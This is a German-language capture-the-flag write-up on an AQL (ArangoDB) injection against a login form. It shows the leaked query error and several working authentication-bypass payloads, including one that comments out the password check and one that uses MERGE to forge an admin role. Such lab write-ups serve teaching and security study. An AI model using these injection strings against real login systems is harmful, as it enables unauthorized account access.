# Startup 

url: http://vuln2.redrocket.club:8123/

url to admin interface: http://vuln2.redrocket.club:8123/admin

Es war schon schwierig das admin interface zu finden (es gab keinen Link dazu). Weiterhin wusste man nicht was man tun soll, bis man die Eingabefelder wie unter 'Injection' beschrieben, ausprobiert hatte. 

## Injection 
* wenn man sich als mit irgendwas (z.B. admin) einloggt und bei pw \ eingibt kommt das hier: 

Error in: 1: FOR u IN users FILTER u.user == 'admin' && u.passwd == '\' RETURN u. ->AQL: unexpected unterminated string literal near 'u' at position 1:67 (while parsing). Errors: {'code': 400, 'error': True, 'errorMessage': "AQL: unexpected unterminated string literal near 'u' at position 1:67 (while parsing)", 'errorNum': 1501}

Die Query lautet also: 
```
FOR u IN users FILTER u.user == '' && u.passwd == '' RETURN u
```

Darauß folgt: 
* tabelle oder schema heißt: users
* die spalten heißen user und passwd

### Wie muss ich die query verändern? 

* ich brauch den admin als user (Annahme war falsch)
* und dann muss ich die Passwort-Abfrage iwie weg kriegen 
* ich kann im Userfeld selbst definieren wie die query aussehen soll (das war richtig)

### Strategie: Alles nach Username-Abfrage auskommentieren

Meine Injection:
```
' RETURN u // 
```
Vor dem RETURN u kann man jetzt hinschreiben, was man möchte - nach dem return u ist alles auskommentiert, also die Passwort-Abfrage wird gar nicht erst ausgeführt 

Hiermit kann man testen, ob die Query funktoniert: 
```
' OR u.user!='' RETURN u // 
```

## Als Admin einloggen 

### Versuchen sich als Rolle "admin" einzuloggen 
```
' || u.role == "admin" RETURN u // 
```
Die hier würde funktionieren, aber es gibt keinen user mit role admin

### Temporär einen admin erstellen: 
```
' OR u.user!='' RETURN MERGE({u: {"role":"admin"}}) //
```

Es wird die Funktion merge genutzt: 
https://www.arangodb.com/docs/stable/aql/functions-document.html

Hier kann man für den user ein Dokument anlegen (also sowas wie attribute setzen). Man setzt jetzt die Rolle auf admin im return wert und gibt u zurück. 














